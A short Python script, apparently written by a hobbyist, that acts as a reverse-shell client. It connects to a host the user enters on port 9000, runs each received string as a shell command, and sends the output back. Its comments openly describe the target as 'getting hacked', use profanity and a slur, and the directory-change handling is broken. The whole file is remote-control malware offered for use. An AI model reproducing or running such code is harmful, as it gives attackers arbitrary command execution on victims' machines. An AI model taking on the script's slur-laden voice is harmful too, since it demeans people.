import os
import socket
import subprocess

s = socket.socket()
host = input("enter local ip: ") # has to be local ip (on the same network) or dies
port = 9000
s.connect((host, port))#connects to ur server innit

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[:3].decode('utf-8'))
        #this shit is for cd so it doesnt fucking die lol
    if len(data) > 0:
        #ay so this here just like wanks and if it wanks less then zero it dies
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        outputbytes = cmd.stdout.read() + cmd.stderr.read()#encodes and decodes in bytes to send
        outputstr = str(outputbytes, 'utf-8')#encodes and decodes in text
        s.send(str.encode(outputstr + str(os.getcwd()) + '> '))
        print(outputstr)#this shit tells the retarded client their getting hacked so turn it on if you want but i wouldnt
s.close()
